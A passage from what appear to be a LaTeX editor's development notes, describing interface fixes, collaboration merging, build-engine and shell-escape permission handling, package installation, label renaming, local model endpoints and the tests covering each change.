is now and that nothing is written until the offer is accepted. What
follows is the join's own offer card. A private project's row offers only
"Find it…", and so does the row of a share this install was removed from,
since a rejoin there would be refused after thirty seconds of waiting;
the share panel says what happened once the copy is opened from wherever
it went.

### A join may land in a folder that already has files

"Joining needs an empty folder" was true and unhelpful: a collaborator
with a git clone of the paper, or a backup of their copy, had to accept
the project into a second folder beside the one they already had. The
reason was real. Two documents built independently from the same text
merge into every line twice, so a folder with files could not be allowed
to build documents of its own.

It still cannot, and now it does not have to. A join or a rejoin into a
folder with files lets the shared documents arrive first, into memory,
and reads the disk only against them. The offer card then says, for each
file, what accepting would do: same as yours; replaces yours, with yours
kept in its history; only here, so it goes to everybody; new from the
others; deleted by the others, so yours goes to the trash. The shared
project wins where the two disagree, and nothing of the writer's is
lost: a text file that loses is a labelled version in its own timeline,
where restoring it is the per-file "use mine", and a binary that loses
is a trash entry. A folder that lacks a file the others have is not an
instruction to delete it. Discarding leaves the folder byte for byte as
it was, including a `.nexttex/collab` of its own that was set aside for
the duration. A folder that already carries this share's own records is
opened as it is, with nothing to offer, because the document logs are the
sync state; a folder carrying another share's is refused.

The card is honest about one limit: a binary can only be compared by
size, since a record carries no hash, so a figure rewritten to the same
number of bytes reads as the same.

### A git clone merges its own edits in

A copy that differs from the shared project is usually a git clone with
work in it, and for a clone there is a base: what the last commit holds.
With a base, "replaces yours" splits three ways on the card. A file that
is exactly what git has is behind the shared copy and is simply replaced,
with nothing recorded, since git keeps it. A file edited since the clone
has its edits merged into the shared text by git's own three-way merge,
and the merged text is what lands and what reaches everybody, with the
local text kept as a version all the same. Only a merge with conflicts
falls back to the shared text winning, because conflict markers must
never reach a shared `.tex`. The words on the card say which: "newer
than yours; replaces it, git has yours" and "your edits merged in; goes
to everybody".

---

## 39. Previews, menus and downloads: the September list

Eight things the writer listed in one message, and one added while the
list was being read. All of them are on the interface's surface: a figure
that would not fit, a field whose typed text could not be seen, a menu
that opened below the screen. Each subsection says what was observed,
what the cause was, and what the interface does now; the browser specs
named in each are what keep it that way.

### A figure of any size opens whole

The image viewer drew a 7000 by 4200 pixel plot at 7000 by 4200 pixels
inside a pane 489 wide, with Fit in the footer and nothing fitting.
The image carried `max-width: 100%; max-height: 100%`, and both
percentages resolved against the paper wrapper round it, which is
`shrink-0` with auto width and height, so they resolved against the
image's own size and meant nothing. A figure exported at 300 dpi is
exactly the figure the viewer exists for, and it was the one it could
not show.

The fit is a number now, not a rule: `fitScale` in
`frontend/src/panes/image-zoom.ts` takes the frame's client box and the
image's natural size and answers the scale at which the whole picture is
inside the frame with the frame's own padding and the paper's hairline
allowed for, capped at 1 so a small figure is shown at its own size
rather than blown up. A `ResizeObserver` on the frame keeps it current,
so dragging a handle or narrowing the window refits a fitted figure. The
image is always drawn at an explicit width, `natural width × scale`, and
nothing depends on percentages inside an auto-sized box again.

Two things followed from having the number. The zoom ladder steps from
what is on screen: `+` from Fit on a plot fitted at seven percent goes to
25%, the next rung above, rather than to 100%, which is what it did when
the ladder assumed Fit meant 1. `nextStep` finds the rung strictly past
the current scale in the direction asked, so a fit between two rungs goes
to the next one rather than to the nearest one, and `−` from a fit below
the lowest rung stays Fit rather than enlarging the picture. And the
footer's Fit word is `quiet`, like the page's *Fit width*, with a rule
before it: the finger-sized tap area `nx-tap` draws is 44 px wide around
a 14 px sign, and with Fit four pixels from `+` the two areas overlapped,
so a press on `+` was answered by Fit. `e2e/specs/image-view.spec.ts`
holds all of it: a 4000 by 2400 PNG inside the frame on both axes with
nothing to scroll, `+` landing on 25%, Fit coming back, the fit following
the window, and a 120 px figure shown at 120 px.

### A figure downloads from where it is being looked at

The writer reported a PNG download failing. The route answers a PNG
with its bytes, `image/png` and an attachment disposition, and the row
menu's *Download* raises a real download in a browser, with the viewer
open or not; neither reproduced the failure, and the browser test that
now holds both is the guarantee that can be given from here. What was
missing was the control a person looking at a figure would reach for:
the card for a file nobody can draw has offered *Download* since it
existed, and the image viewer, the pane a figure actually opens in, had
only the tree's row menu, one pane away. The viewer's footer carries
*Download* now, an anchor with `download` on the file route, beside Fit.
`e2e/specs/image-view.spec.ts` downloads the same PNG three ways, from
the viewer, from the row menu and from its history, and asserts the
bytes each time.

### The source tab menu closes to the right and downloads

Two items on the tab in front's menu, one asked for in the list and
one added while the list was being read. *Close all to the right* keeps
the tab the menu was opened on and everything before it and closes what
follows, the way every editor with tabs spells it; it is disabled on the
last tab, where there is nothing to the right, and `afterClosing` in
`frontend/src/tabs.ts` treats a target that has left the strip the way it
does for *the others*, by closing nothing. The tab the gesture landed on
comes to the front, which matters when the one in front was among those
closed. *Download* takes the file as it stands on disk, by the route the
tree's row menu already used: the files the editor holds had their only
download in the tree, one pane away from where they are being written.
`e2e/specs/tab-menu.spec.ts` closes to the right from a middle tab and
asserts the strip and the tab in front, finds the item disabled on the
last tab, and downloads the file in front and reads its bytes back.

### Typed text is visible in the find field

The writer pressed Ctrl+F in the dark theme, typed, and saw nothing. The
find and replace fields are the two CodeMirror draws; `styles.css` had a
rule for them, `.cm-panel.cm-search input[type="text"]`, and it had never
matched anything, because `@codemirror/search` builds its inputs without a
`type` attribute. The attribute selector found nothing, and CodeMirror's
own `.cm-textfield` painted the box white under whatever ink the theme
handed it: dark on white in the light theme, which looked fine by luck,
and light on white in the dark one at 1.24:1. The rule matches the class
now, which is what is there. `e2e/specs/menus-contrast.spec.ts` types into
both fields in all four shell and page pairings.

### A dismissed question is withdrawn

The tree's row menu kept its history-deletion question after being
dismissed: Escape or a click away closed the menu but not the question,
so the next open of that row's menu showed *Delete every stored version
of …?* again instead of the menu. Closing the menu withdraws the question
now, whichever way it closes. Found while the menu audit below was being
written, by a recipe that opened the question, put it away and asked for
the menu again.

### The matched letters on the selected completion are ink

The completion list marks the letters typed so far in `--hint`, and on
the selected row, which is washed with `--hint-wash`, that put the accent
on a tint of itself: 3.6:1 in the light theme, under the 4.5 that 12px
text needs. On the selected row the matched letters are ink now and the
weight alone says which they are, since the row's own highlight already
says it is the one. The first finding of the menu audit below beyond the
field it was written for.

### An audit of every menu, popup and floating panel, kept as a spec

The audit the writer asked for is `e2e/specs/menus-contrast.spec.ts`, and
it stays in the browser tier rather than being a report: twenty-seven
surfaces, from the tab menus and the tree's row menu with its
history-deletion question open, through Move to…, the papers chooser, the
upload card with a name already taken, the History panel, the rename and
new-file boxes, both searches, the find panels, the completion list, the
selection verbs, the spelling menu, the page footer with its number being
typed, the composer's model and mode menus, the settings sheet, the
share panel and the Markdown preview, each opened the way a person opens
it and measured against the colour actually painted behind its text, in
four shell and page pairings. `docs/testing.md` says how the measurement works. Beyond the
find field and the completion list above, everything it reached was at
5.4:1 or better, which is the answer the writer wanted and the reason the
spec exists: the next surface that draws ink the colour of its ground
fails a check rather than waiting to be noticed. The History panel and
the project search panel gained a `data-testid` so the spec can name
them.

### A menu never opens below the screen

The tree's row menu was placed at `min(button.bottom + 4, viewport - 220)`,
a guess at its own height, and the tab strip's at `min(pointer, viewport - 120)`,
another. A `.tex` row's menu is 306 px tall, the history-deletion
question inside it makes it taller, and from a row near the foot of a
short window the last items, *Move to trash* among them, were below the
screen with no way to reach them.

The height is measured now rather than guessed. `placeMenu` in
`frontend/src/place-menu.ts` takes where a menu wants to be, its measured
size and the viewport, and answers: below the anchor when the whole menu
fits there, above it when it fits there instead, and otherwise as low as
the window allows with the bottom edge inside; on the horizontal axis it
is pushed left until its right edge is in. `useOnScreen` runs it from a
layout effect once the menu is in the DOM, so the menu is moved before
the frame is painted, and again when the question inside the tree's menu
opens or closes. The tree's menu is also capped at the window's height
and scrolls past it, for the window shorter than the menu, which the
placement alone cannot help. Both fixed menus, the tree's and the tab
strip's, go through it; the download menu already had a cap and a scroll,
and the hidden-tabs list has one now, since a strip with forty files open
lists most of them there.
`e2e/specs/menus-on-screen.spec.ts` opens the last of forty rows' menu in
a 600 px window and asserts it ends inside, with and without the
question open, and opens one in a 260 px window and scrolls to its last
item.

### A folder answers a drag over it

Files dragged in from the desktop lit the project root rather than the
folder they were over, and a row dragged from the tree lit its folder
only in flashes. Two causes. The row set the folder as the target on
`dragenter` and the same event, bubbling on to the tree body, set the
root, and React kept the last word; the drop still landed in the folder,
because `drop` already stopped there, so the folder took the file without
ever saying it would. And `dragleave` fires on a row when the pointer
crosses onto the row's own icon or name, after the child's `dragenter`,
so a leave handler that cleared the target put the folder out on every
crossing and the next `dragover` lit it again.

The row now stops the event for desktop files as it already did for its
own rows, and a leave counts before it clears: each `dragenter` an
element sees, its own and its children's bubbling up, adds one and each
`dragleave` takes one away, and only zero, the pointer really outside,
clears the target, and only the target that element set, since the row
entered next has usually set its own already. While a folder is the
target its glyph leans open, the way it does when the folder is open, so
the wash and the row's own mark say the same thing. `e2e/specs/files.spec.ts`
drags a row along a folder's name and onto its icon with the mouse and
asserts the folder holds, and dispatches a desktop file's events by hand
and asserts the folder lights, the root does not, and the crossing onto
the name and the icon leaves it lit.

### A Markdown file is previewed

A `.md` in front of the editor puts its rendering on the preview strip,
as a tab of its own after the documents, on exactly the terms a `.py`
puts its run there (§35): one at a time, this window's own, never the
server's strip, in front of the page and not instead of it, so the page
keeps its scroll and zoom for the next `.tex`. `followDecision` answers
`markdown` for the file, `previewShowing` gains the third value, and the
tab is closeable with a menu of *Close*. A tab the writer closed used
to stay closed while they went on typing in the file, the script tab's
rule; since 2.11.1 the tab and the file close each other (§43).

The text is the editor's. `Editor.tsx` publishes it into
`markdownSource` from the same place and on the same 250 ms cadence it
publishes the section list, because the two are one question, what the
buffer says now; a version being viewed from History is what the buffer
holds, so the pane renders that version, which is what viewing it is
for. `markdownSource` is kept apart from the tab's own state so closing
the tab does not stop the text and the text arriving does not reopen the
tab. The pane, `frontend/src/panes/Markdown.tsx`, is lazy like the
script's, and renders with the chat's own parser from `prose.tsx`:
headings, paragraphs, lists, fenced code and quotes, with code, bold and
italic inside them, on paper in the reading serif at a measure of about
seventy characters. Unlike the chat's rendering the headings keep their
levels. It is deliberately not a library and deliberately not more than
the parser knows: what is wanted is the shape of the prose while it is
being written, and what the parser does not know stays as the literal
text.

The paper carries the white page's own palette, `.nx-theme-light
.nx-theme-white`, whatever the shell's theme. `.nx-page` is paper in both
themes and paper takes dark ink; the first render took the dark shell's
light ink and was pale grey on white, which the menu audit measures for
now. `e2e/specs/markdown-preview.spec.ts` opens a file and finds its
heading, list, quote and code rendered, types a heading and finds it
arrive, puts a `.tex` in front and finds the page back with the tab
kept, closes the tab and finds the file gone with it and reopening the
file bringing it back; an empty file says *Nothing written yet* rather
than showing a blank sheet.

## 40. The first roadmap run: the build

The roadmap's first push, worked in September 2026: what the build can
be asked for. Each subsection says what the writer gets, why it is
shaped that way, and the tests that hold it.

### The engine is the document's choice

NextTex ran pdflatex and nothing else. A paper in a non-Latin script, or
one whose venue hands out a font, needs `fontspec`, and `fontspec` needs
XeTeX or LuaTeX, so the only way to build such a paper was to not use
NextTex. Two ways to choose now, in the order of precedence. A `% !TeX
program = xelatex` line at the top of the main file, which is the line
every other editor honours and which travels with the file into every
co-author's editor; and an *Engine* row on the settings sheet, under the
project's three switches, which writes `engine = "xelatex"` into
`nexttex.toml` so the project carries the choice to another machine.
The row is drawn as pdflatex when the project has no key, never as
nothing pressed, and picking pdflatex removes the key rather than
writing a value the file does not need. A caption under the row says the
line in the file wins over it, because a writer who picks xelatex on the
sheet and still gets pdflatex from a document that says `lualatex` would
otherwise have nothing to go on.

A document that loads `fontspec` or `polyglossia` under pdflatex gets a
drawer row that says *This package needs xelatex or lualatex* and names
the two ways to choose one, keyed on fontspec's own message taken from a
real log rather than typed. A missing engine is named on the status
strip, *xelatex is not installed*, because that is a different fix from
a broken install.

`tests/test_compile_engines.py` reads the comment in every spelling
editors use, builds a `fontspec` document under real xelatex and asserts
the same document under pdflatex is explained, and shows a change of
engine making the next build a full one; `e2e/specs/engine.spec.ts`
picks xelatex on the sheet, builds, types the lualatex line at the top of
the document and finds it win, and reloads to find the sheet still
saying what the project asked for.

### Shell escape is asked for by the project and allowed by the machine

`minted` and `pythontex` need `-shell-escape`, and a build the editor
starts on its own must never pass it silently; the `full_argv`
docstring's argument about the latexmk rc file, that a project carrying
permission to run its own code is the same hole with an extra step,
applies with more force here. So the project asks, with `shell_escape =
true` in `nexttex.toml`, and this machine answers, once per project,
and the flag is passed only when both hold.

While the question stands the status strip says *shell escape?* beside
the build's state and becomes clickable even when the build has no
findings, because the drawer is where the question is drawn and the
drawer opens only from the strip; a project whose document builds clean
without the flag would otherwise ask somewhere nobody could reach. The
drawer's strip says what shell escape is, and *Allow* takes two presses
in the pip card's shape: the first changes to *Yes, allow it on this
computer* and says that every build of this project here may run any
program the document names until it is revoked; the second answers.
The settings sheet shows a *Shell escape* row only when the project
asks, never as a switch on every project, with the same two-press
*Allow* while the question stands and a one-press *Revoke* once it is
answered. The drawer explains minted's own error, *This package needs
shell escape*, as a permission rather than an edit.

A build without the flag under a document that names a program logs
`runsystem(...)...disabled (restricted)`, and the first build after
Allow used to log the same, because latexmk had decided nothing changed
and run no engine; that build is forced now. `nexttex.toml` saved in the
editor is also read at once, which it was not: the file was read when
the project opened and never again.

`tests/test_shell_escape.py` holds the four combinations of request and
answer, the forced rerun surviving a cancelled build, and the config's
validation; `tests/api/test_shell_escape_route.py` runs the whole path
with a real engine and a `\write18` marker file, and the re-read of a
saved toml; `e2e/specs/engine.spec.ts` answers the question from the
strip and the drawer in two presses, finds the marker appear, and
revokes from the sheet.

### A missing package is installed from its row

The commonest build failure on a TinyTeX is a `.sty` that is not there,
and the drawer's row for it said "run `tlmgr install <name>`", the one
instruction in NextTex that sent somebody to a terminal. The row now
carries the button. Opening the row asks the server which package
provides the file, from tlmgr's own file search, so the button says
*Install algorithm2e* before anything is pressed; a file no package on
the mirror provides says so and suggests the spelling, and a TeX with no
package manager leaves the row as it was. Two presses, the pip card's
shape: the first becomes *Yes, install algorithm2e* and says that it
downloads from a CTAN mirror with tlmgr and builds again; the second
installs, and the row then says the package is installed and a build is
under way. A failing install shows tlmgr's own words under the row in a
scrolling block, because a TinyTeX behind its mirror fails with "remote
repository is newer than local" and that sentence is the whole of the
fix. A missing `.cls` gets the same row under its own title.

`tests/test_texpkg.py` parses tlmgr's real output, remembers an answer
per file, refuses anything that is not a package name before the manager
sees it, and hands back the manager's words on failure;
`tests/api/test_tex_install.py` drives both routes through the stand-in;
`e2e/specs/tex-install.spec.ts` builds a document that asks for a package
nothing has, presses the button twice, reads the argv the stand-in saw
and finds a build follow, then shows the stale-mirror failure.

### A tab that is not in front still follows its file

Found while chasing a report that a deleted file's tab broke the other
tabs (the next section): the breakage had nothing to do with deletion.
A file open in a tab that was not in front did not take changes made
to it while it was parked, by an outside rewrite, by the agent or by a
collaborator; the tab came back showing what it showed when it was
parked, and the next remote change was then spliced into the wrong
offsets, "hTWe" in the middle of "here". The collaboration binding
watches the shared text only while its state is in the view. The parked
state is now brought into step with the shared text as it comes back,
with the caret moving as it would for an edit made in front, and the
History panel's comparison and the word count read a parked file's
shared text rather than its state. `frontend/src/panes/parked.test.ts`
holds the minimal change; `e2e/specs/parked-tab.spec.ts` rewrites a
parked file from outside and through the file route, brings the tab
back, and finds it current and still in step for the next change.

### A deleted file's tab closes, and closing the tab in front shows the next

The writer's report, raised mid-run: deleting a file that was open in a
tab left a dead tab on the strip, and while it was there the other
files did not display properly; closing the dead tab by hand restored
things. Three faults, not one.

The dead tab: a rename publishes `renamed` and the tab moves, and a
deletion published nothing that said a path had gone, so the tab stayed,
bound to a document the manifest had trashed. The delete route and the
watcher's deletion say `gone` now, and the tabs at or under a gone path
close, a folder taking every tab under it; the window that did the
deleting closes them at once rather than on the event.

The display: closing the tab in front, by any means, moved the strip to
the next tab and left the view on the closed file's text. `get()` hands
back the store's live state, and the close compared the new active path
against that state after writing it, so it never saw a change and never
opened the tab it had just put in front. It reads the old value first
now. This was the whole of "the editor goes crazy": the strip said one
file and the view showed another, bound to nothing.

And the parked tab of the previous section, which is why a file
rewritten from a shell kept showing its old text.

`tests/api/test_files.py` asserts `gone` on the route's event and on the
watcher's; `frontend/src/tabs.test.ts` holds the tabs a deletion takes;
`e2e/specs/deleted-open-file.spec.ts` deletes an open file from the
tree and from disk and a folder with two open files, and finds the tabs
gone and the one that is left in front, showing its file and writing;
`e2e/specs/tab-menu.spec.ts` closes the tab in front from the strip and
finds the next one shown.

### The TeX version on every build

The raw log a row opens begins with the engine's own version line,
"pdfTeX 3.141592653-2.6-1.40.29 (TeX Live 2026)", from the build that
wrote the log, and the bug report's tools table prints the same line
for TeX, which it had printed for git, Python, uv and Node and never
for the one tool a report about a build is about. `tests/test_compile_engines.py`
asks for the version once per process; `tests/test_install_survey.py`
fills the finding; `tests/api/test_report_route.py` finds it in the
report; `e2e/specs/tex-install.spec.ts` opens the raw log and reads the
first line.

## 41. The first roadmap run: the editor

The roadmap's second push: what the source pane can say and do.

### Hover says the number

Hovering `\ref{fig:a}` said "chapters/two.tex, line 4", which is where
the label is, not what the reference will say. Every build writes the
number into the `.aux` files, so the tooltip now says "Figure 3, on page
7" from the last build, with the file and line beneath it in the quieter
hint style, and the Ctrl-click still goes there. The kind is the word
hyperref's anchor names, Figure, Table, Equation, Section, Chapter,
Theorem and the rest; a kind nothing here names shows its number alone,
and a document without hyperref has a number and a page and no kind.
Before the first build there is only the place, as before. The
completion list inside a `\ref` shows the same words beside each label
in place of the file name once a build has given them.

Hovering `\includegraphics{figures/plot}` shows the figure itself, at
a size that stays a tooltip, above its resolved path, with the suffix
the call leaves off found among the images the symbol scan collected.
A PDF figure shows as the browser shows a PDF in an image tag, which is
not at all, and the path beneath still says which file it is.

`tests/test_auxlabels.py` parses fixtures copied from a real build,
follows an included chapter, refuses an input outside the build
directory and ends a loop; `tests/api/test_symbols_numbers.py` builds
for real and finds the numbers on the route; the vitests in
`latex-links.test.ts` and `latex-complete.test.ts` hold the wording;
`e2e/specs/latex-links.spec.ts` hovers a reference after a build and
reads "Section 1, on page 1", then hovers a figure and finds it drawn at
its own size.

### Sections and environments fold

A fold gutter beside the line numbers, on a LaTeX file only: a Python
script has no sections and gets no gutter, and the read-only version
view folds like the live one. A section folds to the line before the
next heading of its level or above, trailing blank lines left out so the
fold ends where the prose does, and the last one to `\end{document}`;
an environment folds to the line before its `\end`, which stays visible
so the fold reads as a closed box; a `\begin` and `\end` on one line, an
unmatched `\begin`, and the `document` environment fold nothing, and a
verbatim block is opaque, so an `\end{itemize}` quoted inside one closes
nothing. The ranges come from the text, not from a syntax tree, because
the LaTeX mode is a stream parser with no tree, and they are computed
once per document version since the gutter asks about every visible
line on every redraw. Folding is a view decoration: the shared document
and its undo history are untouched.

The marker is a chevron in the gutter's own ink, shown while the gutter
or its line is under the pointer and on every folded line, rather than a
column of arrows beside every section the rest of the time; the
placeholder says how many lines are hidden and unfolds on a click.
`Mod-Shift-[` folds the section or environment the caret is in, walking
up to the innermost range that reaches the caret, where the library's
own command folds only a range starting on the caret's line;
`Mod-Shift-]` unfolds, and `Mod-Alt-[` and `]` fold and unfold
everything. The gutter and the fold service cost 8.3 kB of the entry
chunk, which took it over its budget; rather than raise the budget a
third time, the rail's four footer panels, the trash, the papers, the
context and git, are fetched when the editor opens rather than shipped
with it, as `bench/thresholds.json` had asked for before the next
raise, and the chunk is 21 kB smaller than before the gutter.

`frontend/src/folds.test.ts` holds the ranges: nesting, the last
section, a starred heading, a commented one, an environment inside a
section, the opaque verbatim block, and the cases that fold nothing;
`e2e/specs/folds.spec.ts` folds a section from the gutter, reads the
placeholder's count, finds the section below still shown, unfolds from
the placeholder, folds a list on its own, and folds and unfolds by
keyboard from inside a section.

### A bar above the source says where you are

A long chapter says which section the top of the pane is in without
scrolling up to find out: a one-line bar over the source, in the quiet
ink, with the trail from the outermost enclosing heading down to the
current one, "Method › Sampling › Frames", the last of them a shade
darker. It is driven by the first line on screen, read off the editor's
own line blocks on scroll once a frame, and not by the caret, which is
the question the Sections panel already answers and a different one:
the caret can be forty lines below the top of the screen, in the next
section. The bar hides before the first heading, on a heading's own
line, where the source already says it and a bar would cover the line
beneath, in a file with no headings, and while an old version is on
screen, whose lines are not the outline's. A click goes to the heading.
An `\include` in a skeleton is not a place a reader is inside, and the
bar names the last real heading above it instead.

`frontend/src/section-at-top.test.ts` holds the hide rules and the
trail; `e2e/specs/sections.spec.ts` scrolls a long chapter into its
second section, reads the bar, clicks it to the heading, and scrolls to
the top to find it gone.

### Rename a label or citation key everywhere

Renaming `fig:overview` was a project-wide replace the writer had to
scope by hand, and a replace does not know the syntax: `fig:a` matches
inside `fig:ab`, and a name in a comment is rewritten as readily as one
in a `\ref`. The hover on a `\label`, a `\ref` or a `\cite` now carries
two verbs, *Find references* and *Rename*, and F2 on one is the rename.
Both go to the search panel, which opens the way Mod-Shift-F opens it:
it lists every use file by file, "4 uses of sec:a in 2 files, 1 in a
comment", with a `%` beside a use that sits in a comment, and *Rename*
puts a box under the summary with the name filled in and selected. A
new name and Enter ask first, in the sentence the project replace uses,
because it is the same edit, across the project and not one Mod-Z can
take back; *Rename everywhere* writes it, each changed file keeps a
version, and the editor shows the new name at once since the save went
through the shared document. A hit in a comment is left alone unless
the checkbox that appears when there is one is ticked. A label is found
in its definition and in the whole reference family with comma lists; a
citation key in the `.bib` entry's own line and in every cite command
with its optional arguments; a macro at its definition and at every use
that is not the head of a longer name. `fig:a` leaves `fig:ab` alone,
and `knuth` leaves `knuthx` alone. Typing a query or pressing Close or
Escape leaves the references and the panel is a search again.

`tests/test_rename.py` holds the syntax, the prefix cases, the comment
and the regex characters; `tests/api/test_rename_routes.py` renames
across two files and the bibliography and finds a version for each;
`e2e/specs/rename.spec.ts` renames from the tooltip with the
confirmation, reads both files and the histories, and opens the rename
by F2 and the list by the other verb.

## 42. The first roadmap run: papers, provider and window

The roadmap's third push.

### Search the literature yourself

The agent can search Crossref, OpenAlex and Semantic Scholar and the
writer without an agent could not, which is the one place the README's
promise that everything the agent does with references is yours without
one did not hold. The Papers section at the foot of the file list has a
search box above its DOI box now: a query, a chooser for the publisher,
Enter or *Search*, and each result as a row with its title, its first
author with "et al." when there are more, its year and its venue, and an
*Add* that goes through the same add-by-DOI path as the box beneath, so
what lands in the `.bib` is the publisher's own record either way; the
row then shows the key it made, or the reason it could not. A record
with no DOI says so in place of the button. The route asks the vendored
search on a worker thread, ten rows, and a publisher that will not
answer is a 502 with its words rather than a 500. The box is there
whenever the project has a `.bib`, since that is where an *Add* would
go.

`tests/api/test_library_routes.py` stubs the publisher and holds the
row shape, the refusals and the 502; `e2e/specs/papers.spec.ts`
intercepts both routes, searches from the box, reads the rows, adds one
and finds its key beside it.

### Local models through the OpenAI provider

The OpenAI provider spoke to one host. Ollama, LM Studio, vLLM and most
local servers speak the same protocol, so the sign-in form's OpenAI
panel gains a *Base URL* field under the key and the model, with a
sentence that names the two common ones, `http://localhost:11434/v1`
and `http://localhost:1234/v1`, and says that with one no key is needed
and nothing leaves this machine. The key is optional once a URL is
typed; the model becomes required, and the form says so before it saves
rather than letting the first turn fail, because a local server has no
default model the way OpenAI does; an empty URL is OpenAI itself. The
status route answers ready on a URL alone and carries the URL, and
choosing no agent forgets it with the key. The README's sentence that
nothing leaves the machine now holds with an agent running, and its
list of what goes out says so.

`tests/test_openai_local.py` posts to the endpoint the base URL makes,
sends no bearer token without a key, and ends a turn whose stream has
no usage chunk with the footer's fields intact; `tests/api/test_agent_opted_out.py`
holds the route's refusals and the status; `e2e/specs/sign-in.spec.ts`
fills the form with a URL and no key, is told the model is needed,
names one, and finds the status ready.

### The page in its own window

A writer with a second monitor wants the typeset page on it, alone and
live, and the only way to get it was a second copy of the whole app,
with its rail and its editor and its own idea of which tab is in front.
The preview tab's menu gains *Open in its own window*, under *Download
PDF*, which opens the same document at `?page=<project>&document=<name>`
in a new window. That window holds a one-line header, the logo, the
project's name and the document's, and the page beneath it and nothing
else: the PDF pane with its own zoom, its own view mode and its own
find, the `nexttex.pdf.*` preferences shared with the main window
because a second monitor wants the same page at the same size. It sits
on the same event stream, so a build in the first window redraws it,
and it asks for a build when it opens so it never shows the absence of
one. A double-click on its page has no editor to go to and does nothing.
The browser decides whether the new window is a window or a tab, and
the writer can drag it either way.

`frontend/src/page-window.test.ts` reads the URL back and refuses an id
that is not one and a document that tries to leave the project;
`e2e/specs/page-window.spec.ts` opens the window from the menu, finds the
page and no editor or tree in it, grows the document in the first window
and watches the page count change in the second.

## 43. The history panel reviewed, and a Markdown preview that behaves like the page

Two requests from the writer in September 2026, after the first roadmap
run: a look at the history panel, whose close arrow was drawn over other
things, and a Markdown preview whose tab brings its file and whose page
can be double-clicked to reach the line. Each subsection says what
changed, why it is shaped that way, and the tests that hold it.

### The header held five things in 264 pixels

The panel's one 32 px header carried the title, the *This file / Whole
project* toggle, the file's name, the size the history holds on disk and
the close chevron, and everything but the name was `shrink-0`. About 300
px of it in a 264 px panel: the name was squeezed to nothing, and the
chevron, the one thing in the row that must not lose, was drawn over the
size and squeezed to 18 px. The header is two rows now. The first is the
handle, the title, the file's name with its full path as a title, and
the chevron, and it closes on a click as it did. The second is a toolbar,
the toggle at the left and the size at the right, and does not close on a
click because a toolbar is a different kind of thing from a handle.
`e2e/specs/history-panel.spec.ts` measures the chevron's box against the
toggle's and the size's, docked and over the editor, and finds the name
drawn at a width.

Reading the file to fix that found four more things, each of which had
been true since the panel was built. **A row could not show that it was
hovered or chosen**: both were drawn in `--surface-2`, which is the
panel's own ground, so the 2 px pen bar was the whole of the selection
and hover was nothing at all. Rows paint `--surface` now, one step off
the panel's ground, which is the file tree's own rule on its own ground.
**Name it and Compare were hover-only**, so a finger on a tablet and a
keyboard on any machine could see a version and do nothing with it; the
row that has been chosen carries them without a pointer over it, and so
does a row with focus inside it, and the size gives way to them on the
same terms. `touch.spec.ts` taps a row and finds the control. **Escape
did nothing in the panel** unless a version was on screen, though §19
had claimed the panel owned the key; and the shell's own Escape stood
down whenever the panel was open, on the premise that it covered the
screen, which a docked panel does not, so a writer in the composer with
history open could not close the chat. The keyboard arrives with the
panel now, so Tab and Escape work from the moment it opens; Escape
leaves one level at a time, the way it does on the agent screen, a
version being viewed going back to now first and the next press closing
the panel; cancelling a name with Escape cancels the name and nothing
else; and the shell no longer stands down for it. **A truncated reason,
name or path** carries its full text as a title.

**The viewing banner tore its buttons in a narrow pane.** It was a fixed
26 px with nothing said about wrapping, and beside a docked history panel
the editor is narrow enough that "Show what's gone" broke across two
lines with the second drawn outside the bar. It wraps now, and each
control keeps its rule with it so a second row starts with a word rather
than a stray line; the spec measures every button whole inside the
banner at 1100 px.

### The list follows the versions as they are recorded

The panel read its list when it opened and again after every build,
which is the right trigger for a `.tex` and the wrong one for everything
else: a `.md` typed into never builds, so its versions were recorded and
the open panel went on showing the list from when it opened, and a
collaborator's version arriving through history sync waited for the next
build the same way. The server says `history_changed` now, from the
history's own hook, the one the peers already listen on, naming every
file whose log grew a moment after the last of them; the panel refreshes
the file's list when the file on screen is named, and the size and the
project timeline on any. The mechanics are in `docs/architecture.md`.
`e2e/specs/history-panel.spec.ts` opens the panel on a `.md`, types, and
finds a new row while the event counter shows that no build ran.

### The Markdown tab brings its file

A document tab on the preview strip has always brought its file to the
source pane, through `showPreview`; the Markdown tab brought its
rendering forward and left the editor on whatever it had, so reading the
notes and then wanting to write in them meant a second click in the
tree. The rendering and the source are one file, and choosing to read it
is choosing to be in it, so the tab opens its file now, on the strip's
own terms: nothing moves the keyboard. The script tab deliberately does
not: its content is a run's output, read beside the page while the
chapter that includes the figure is being written, and pulling the
source to the script would take the writer away from what they were
doing. `e2e/specs/markdown-preview.spec.ts` puts `main.tex` in front,
chooses the Markdown tab, and finds `notes.md` the source tab in front.

### A double-click on the rendering goes to its line

The page has had this since §6, through SyncTeX and a round trip to the
server, and it is the thing that makes a preview beside the source worth
more than one in another window. The Markdown pane needs no server for
it: the parser read the file's lines itself, so every block carries the
line it starts on and every list item its own, in `data-line`, and a
double-click on the rendering names the line. Which line of a paragraph
that spans several is answered by the word the second click selected,
looked for on the block's own lines; the editor then puts the caret on
that word with the same `locateWord` the page's jump uses, told the
source is plain prose so a `%` on the line is a percent sign and not a
comment, the case that would otherwise blank "users" out of "50% of
users". A code block's text is one line below its fence, and a click on
punctuation or a bullet lands at the block's first line.

The chat's comparison of two blocks still ignores the lines on purpose,
since a message redrawn for a line inserted above would redraw every
block below it for no visible change; the pane compares them as well,
because it writes them into the DOM and a paragraph that moved down has
to be drawn again or its double-click would name the old line.
`prose-lines.test.ts` holds the line of every kind, of each list item,
of a fence, and under Windows line endings and runs of blanks;
`markdown-source.test.ts` holds the word's line inside a block and the
comparison; `locate-word.test.ts` holds the plain case both ways; and
the browser spec double-clicks the bold word and finds the caret at
exactly its line and column, which the page's spec, depending on the
typesetting, cannot claim.

### The whole project downloads from inside it

Reported by the writer during this run: *Whole project* from the
download menu inside an open project failed with the browser's "Check
internet connection", while the same download from the project list
worked. Both screens asked the same route through the same `<a
download>` link, the route is unchanged since the install that saw it,
and the server's journal held no error. Driving a real Chromium against
the running install reproduced it exactly: over the tailnet's HTTPS
address, from inside an open project, once the page had been open about
ten seconds, the browser cancelled the link download before sending a
byte; within eight seconds it went through, over plain HTTP it never
failed, and a `fetch` of the same URL from the same page at the same
moment succeeded every time. What Chrome's download manager objects to
in that state was not established, and it is recorded as such rather
than guessed at; what is established is which road works. The ZIP takes
it now: fetched by the page and saved, the way the PDF download has
been since it needed to say why a document did not typeset, from all
three places the ZIP is offered. And since nothing in what was seen was
about the ZIP's URL, the same probe was pointed at a single file and at
a PDF by the link road, and both were cancelled the same way, so the
writer had five more broken controls on that install: the tree's
*Download*, the source tab's, the figure viewer's, and the history
